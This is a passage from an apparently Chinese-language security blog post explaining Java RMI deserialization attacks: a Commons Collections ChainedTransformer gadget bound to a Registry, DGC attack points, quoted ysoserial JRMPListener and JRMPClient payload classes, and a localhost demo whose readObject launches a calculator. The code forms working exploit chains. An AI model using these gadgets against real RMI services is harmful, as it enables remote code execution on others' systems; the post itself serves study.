class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 连接 Registry</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        <span class="hljs-comment">//使用 AnnotationInvocationHandler 动态代理 Remote</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;EddieMurphy&quot;</span>, getEvilClass());<br><br>        <span class="hljs-comment">//使用动态代理初始化 AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);<br><br>        <span class="hljs-comment">//使用 AnnotationInvocationHandler 动态代理 Remote</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, invocationHandler);<br><br>        <span class="hljs-comment">//bind 到 Registry 时会触发反序列化</span><br>        registry.rebind(<span class="hljs-string">&quot;EddieMurphy&quot;</span>, remote);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 初始化 Hashmap</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">// 创建 ChainedTransformer</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里需要 Registry 端具有相应的依赖及相应 JDK 版本需求。</p><p>这个攻击手段实际上就是 ysoserial 中的 <strong>ysoserial.exploit.RMIRegistryExploit</strong> 的实现原理。</p><p>除了 bind，由于 lookup&#x2F;rebind 等方法均通过反序列化传递数据，因此此处的实际攻击手段不止 bind 一种。也就是说，名义上的 Server 端和 Client 端都可以攻击 Registry 端。</p><h3 id="Client-端-Attack"><a href="#Client-端-Attack" class="headerlink" title="Client 端 Attack"></a>Client 端 Attack</h3><p>如果攻击的目标作为 Client 端，也就是在 Registry 地址可控，或 Registry&#x2F;Server 端可控，也是可以导致攻击的。客户端主要有两个交互行为，第一是从 Registry 端获取调用服务的 stub 并反序列化，第二步是调用服务后获取执行结果并反序列化。</p><p>这部分攻击实战意义较少，并且与上述讨论的攻击 Server 端和 Registry 端的攻击都是镜像行为，所以这里简单描述一下流程就不再演示了。</p><p>客户端的攻击和上面的都类似，大概就下面几个攻击点</p><ul><li>恶意Server返回方法调用结果</li><li>恶意Server(Registry)返回Stub</li><li>动态类加载（Server返回的调用结果若为客户端不存在的类，客户端也支持动态加载）</li></ul><h3 id="DGC-Attack"><a href="#DGC-Attack" class="headerlink" title="DGC Attack"></a>DGC Attack</h3><p><strong>DGC（Distributed Garbage Collection）</strong>—— 分布式垃圾回收，当 Server 端返回一个对象到 Client 端（远程方法的调用方）时，其跟踪远程对象在 Client 端中的使用。当再没有更多的对 Client 远程对象的引用时，或者如果引用的“租借”过期并且没有更新，服务器将垃圾回收远程对象。启动一个 RMI 服务，就会伴随着 DGC 服务端的启动。</p><p>RMI 定义了一个 <code>java.rmi.dgc.DGC</code> 接口，提供了两个方法 <code>dirty</code> 和 <code>clean</code>：</p><ul><li>客户端想要使用服务端上的远程引用，使用 <code>dirty</code> 方法来注册一个。同时这还跟租房子一样，过段时间继续用的话还要再调用一次来续租。</li><li>客户端不使用的时候，需要调用 <code>clean</code> 方法来清楚这个远程引用。</li></ul><p>这个接口有两个实现类，分别是 <code>sun.rmi.transport.DGCImpl</code> 以及 <code>sun.rmi.transport.DGCImpl_Stub</code>，同时还定义了 <code>sun.rmi.transport.DGCImpl_Skel</code>。</p><p>这个命名方式看着确实非常眼熟。</p><p>没错，很像 Registry、RegistryImpl、RegistryImpl_Stub、RegistryImpl_Skel，实际上不单是命名相近，处理逻辑也是类似的。通过在服务端和客户端之间传递引用，依旧是 Stub 与 Skel 之间的通信模式：Server 端启动 DGCImpl，在 Registry 端注册 DGCImpl_Stub ，Client 端获取到 DGCImpl_Stub，通过其与 Server 端通信，Server 端使用 RegistryImpl_Skel 来处理。</p><p>攻击手段就是</p><p>DGCImpl_Stub#dirty</p><p>DGCImpl_Skel#dispatch</p><p>见ysoserial的<code>exploit.JRMPListener</code>和<code>exploit.JRMPClient</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPListener</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PayloadRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;UnicastRemoteObject&gt; &#123;<br><br>    <span class="hljs-keyword">public</span> UnicastRemoteObject <span class="hljs-title function_">getObject</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String command )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">jrmpPort</span> <span class="hljs-operator">=</span> Integer.parseInt(command);<br>        <span class="hljs-type">UnicastRemoteObject</span> <span class="hljs-variable">uro</span> <span class="hljs-operator">=</span> Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>            RemoteRef.class<br>        &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastServerRef</span>(jrmpPort)<br>        &#125;);<br><br>        Reflections.getField(UnicastRemoteObject.class, <span class="hljs-string">&quot;port&quot;</span>).set(uro, jrmpPort);<br>        <span class="hljs-keyword">return</span> uro;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        PayloadRunner.run(JRMPListener.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPClient</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PayloadRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Registry&gt; &#123;<br><br>    <span class="hljs-keyword">public</span> Registry <span class="hljs-title function_">getObject</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String command )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        String host;<br>        <span class="hljs-type">int</span> port;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">sep</span> <span class="hljs-operator">=</span> command.indexOf(<span class="hljs-string">&#x27;:&#x27;</span>);<br>        <span class="hljs-keyword">if</span> ( sep &lt; <span class="hljs-number">0</span> ) &#123;<br>            port = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">65535</span>);<br>            host = command;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            host = command.substring(<span class="hljs-number">0</span>, sep);<br>            port = Integer.valueOf(command.substring(sep + <span class="hljs-number">1</span>));<br>        &#125;<br>        <span class="hljs-type">ObjID</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjID</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt()); <span class="hljs-comment">// RMI registry</span><br>        <span class="hljs-type">TCPEndpoint</span> <span class="hljs-variable">te</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPEndpoint</span>(host, port);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LiveRef</span>(id, te, <span class="hljs-literal">false</span>));<br>        <span class="hljs-type">RemoteObjectInvocationHandler</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjectInvocationHandler</span>(ref);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>            Registry.class<br>        &#125;, obj);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());<br>        PayloadRunner.run(JRMPClient.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>攻击的gadget分 UnicastRemoteObject、UnicastRef和RemoteObject三种。这里不做过多解释。</p><p>总结为</p><ul><li>exploit<ul><li>JRMPListner：构造恶意JRMP服务器，返回异常让客户端反序列化 <code>StreamRemoteCall#executeCall</code></li><li>JRMPClient：发送恶意序列化数据，打DGC服务 <code>DGCImpl_Skel#dispatch</code></li></ul></li><li>payloads<ul><li>JRMPListner：<code>UnicastRemoteObject</code>反序列化时会导出对象，触发JRMP监听端口，配合exploit.JRMPClient打</li><li>JRMPClient：<code>UnicastRef</code>反序列化时会触发DGC的<code>ditry</code>，配合exploit.JRMPListner打</li></ul></li></ul><h2 id="Final-Test"><a href="#Final-Test" class="headerlink" title="Final Test"></a>Final Test</h2><p>最后浅浅打一个简单使用RMI服务调用远程对象反序列化弹calc作为我最后的结束吧，JEP 290的bypass放在后面文章再进行复现。JNDI也同样会放在后面再详细复盘。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream objectInputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        objectInputStream.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">RMITestImpl</span> <span class="hljs-variable">rmiTest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMITestImpl</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">8081</span>);<br>        registry.bind(<span class="hljs-string">&quot;EddieMurphy&quot;</span>,rmiTest);<br>        System.out.println(<span class="hljs-string">&quot;RMI Server is listening ...&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NotBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">8081</span>);<br>        <span class="hljs-type">RMITest</span> <span class="hljs-variable">rmiTest</span> <span class="hljs-operator">=</span> (RMITest) registry.lookup(<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        rmiTest.sayObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">payload</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RMITest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testcalc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayObject</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMITestImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RMITest</span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RMITestImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testcalc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayObject</span><span class="hljs-params">(Object obj)</span> &#123;<br>        System.out.println(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/RMI-JNDI/7.png" alt="7"></p><p>抄了下<a href="https://blog.csdn.net/uuzeray/article/details/135886709?ops_request_misc=%7B%22request_id%22:%22172199251516800186550713%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172199251516800186550713&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-135886709-null-null.nonecase&utm_term=RMI&spm=1018.2226.3001.4450">【心得】java JNDI配合RMI实现注入个人笔记_${jndi:rmi:-CSDN博客</a>（我是懒狗）</p><p>原理很简单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>、定义远程接口 (RMITest.java):  <br>· 定义了一个远程接口 RMITest，其中包含两个方法 testcalc() 和 sayObject(Object obj)。<br>这些方法声明抛出 RemoteException，以便在远程调用时处理可能的网络问题。<br><br><span class="hljs-number">2</span>、实现远程接口 (RMITestImpl.java):  <br>· RMITestImpl 类实现了 RMITest 接口，并继承了 UnicastRemoteObject，使其成为一个远程对象。<br>· 在 testcalc() 方法中，使用 Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>) 来执行系统命令，弹出计算器。<br>· sayObject(Object obj) 方法简单地打印传入的对象。<br><br><span class="hljs-number">3</span>、创建并启动RMI服务器 (RMIServer.java):  <br>· 在 main 方法中，创建 RMITestImpl 的实例。<br>· 使用 LocateRegistry.createRegistry(<span class="hljs-number">8081</span>) 创建一个在端口 <span class="hljs-number">8081</span> 上监听的 RMI 注册表。<br>· 将 RMITestImpl 实例绑定到注册表中，名称为 <span class="hljs-string">&quot;EddieMurphy&quot;</span>。<br>· 打印一条消息表示服务器正在监听。<br><br><span class="hljs-number">4</span>、创建并启动RMI客户端 (RMIClient.java):  <br>· 在 main 方法中，使用 LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">8081</span>) 获取服务器的注册表。<br>· 使用 registry.lookup(<span class="hljs-string">&quot;EddieMurphy&quot;</span>) 查找远程对象，并将其强制转换为 RMITest 接口。<br>· 调用 rmiTest.sayObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">payload</span>()) 方法，传递一个 payload 对象。<br>· 调用 rmiTest.testcalc() 方法，执行远程方法，弹出计算器。<br></code></pre></td></tr></table></figure><p>后续的JNDI是重头戏，lookup是典型的特征。那么JNDI结合RMI打法就先留待抛砖引玉吧。</p><p>参考：</p><p><a href="https://p4d0rn.gitbook.io/java/prerequisites/rmi-and-jndi/rmi">RMI | Java (gitbook.io)</a></p><p><a href="https://su18.org/post/rmi-attack/">Java RMI 攻击由浅入深 | 素十八 (su18.org)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
